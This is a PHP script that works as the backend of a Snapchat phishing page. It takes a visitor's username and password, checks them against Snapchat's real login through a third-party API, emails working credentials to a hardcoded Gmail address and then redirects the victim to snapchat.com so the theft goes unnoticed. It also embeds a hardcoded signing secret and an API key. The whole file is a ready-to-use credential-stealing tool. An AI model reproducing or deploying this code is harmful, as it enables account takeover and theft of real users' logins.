<?
function base64($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}
function login($username,$password) {
	$header = ['alg'=>'HS256','typ'=>'JWT'];
	$enheaders = base64(json_encode($header));
	$time = time();
	$payload = ['sub'=>'Joe','username'=>$username, 'password'=>$password,'iat'=>$time];
	$enpayload = base64(json_encode($payload));
	$secret = 'f3cdf4bbf206f5d572c6db13757c06fe';
	$hash = hash_hmac('SHA256',"$enheaders.$enpayload",$secret,true);
	$signature = base64($hash);
	$jwt = "$enheaders.$enpayload.$signature";
	###################################################
	$casper = curl_init();
	curl_setopt($casper, CURLOPT_URL, "https://casper-api.herokuapp.com/snapchat/ios/login");
	curl_setopt($casper, CURLOPT_SSL_VERIFYPEER, true);
	curl_setopt($casper, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($casper, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($casper, CURLOPT_HEADER, 1);
	curl_setopt($casper, CURLOPT_POST, true);
	curl_setopt($casper, CURLOPT_HTTPHEADER, array(
		'X-Casper-API-Key: dd3779d571409a67743c7e0e18a2cc04',
		'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
		'User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T)',
		'Host: casper-api.herokuapp.com',
		'Connection: Keep-Alive'
	));
	curl_setopt($casper, CURLOPT_POSTFIELDS, "jwt=$jwt");
	curl_setopt($casper, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T)");
	$rescasper = curl_exec($casper);
	curl_close($casper);
	/////////////////////
	$startauth = explode('"X-Snapchat-Client-Auth-Token":"' , $rescasper );
	$endauth = explode('"' , $startauth[1] );
	$auth = $endauth[0];
	###################### "X-Snapchat-Client-Token":"
	$starttoken = explode('"X-Snapchat-Client-Token":"' , $rescasper );
	$endtoken = explode('"' , $starttoken[1] );
	$token = $endtoken[0];
	#######################
	$startreq = explode('"req_token":"' , $rescasper );
	$endreq = explode('"' , $startreq[1] );
	$req = $endreq[0];
	####################### "timestamp":
	$starttime = explode('"timestamp":"' , $rescasper );
	$endtime = explode('"' , $starttime[1] );
	$time = $endtime[0];
	$snapchat = curl_init();
	curl_setopt($snapchat, CURLOPT_URL, "https://auth.snapchat.com/scauth/login");
	curl_setopt($snapchat, CURLOPT_SSL_VERIFYPEER, true);
	curl_setopt($snapchat, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($snapchat, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($snapchat, CURLOPT_HTTPHEADER, array(
		"X-Snapchat-Client-Token: $token",
		'User-Agent: Snapchat/10.17.0.5 (iPhone6,2; iOS 9.3.2; gzip)',
		"X-Snapchat-Client-Auth-Token: $auth",
		'Accept-Language: en-NZ;q=1',
		'Connection: Keep-Alive'
	));
	curl_setopt($snapchat, CURLOPT_POSTFIELDS, "password=$password&timestamp=$time&username=$username&req_token=$req");
	curl_setopt($snapchat, CURLOPT_USERAGENT, "Snapchat/10.17.0.5 (iPhone6,2; iOS 9.3.2; gzip)");
	$response = curl_exec($snapchat);
	curl_close($snapchat);
	return $response;
}
function mailer($username,$password) {
    $from = "test@yopmail.com";
    $to = "leetroot3d@gmail.com"; # Your Email
    $subject = "B0x3d Snapchat Account";
    $message = "Username:$username\nPassword:$password";
    $headers = 'From: webmaster@example.com' . "\r\n" .
		'Reply-To: webmaster@example.com' . "\r\n" .
		'X-Mailer: PHP/' . phpversion();
    return mail($to, $subject, $message, $headers);
}
#######################################################################
if($_POST['login']){
	if($_POST['username']){
		if($_POST['password']){
			$user = $_POST['username'];
			$pass = $_POST['password'];
			$output = login($user,$pass);
			if(eregi('"logged":true,', $output)){
				mailer($user,$pass);
				header('Location: https://www.snapchat.com/');
			}
			else
			{
				echo '<font color="red">كلمة السر خاطئة.</font>';
			}
		}
	}
}
?>
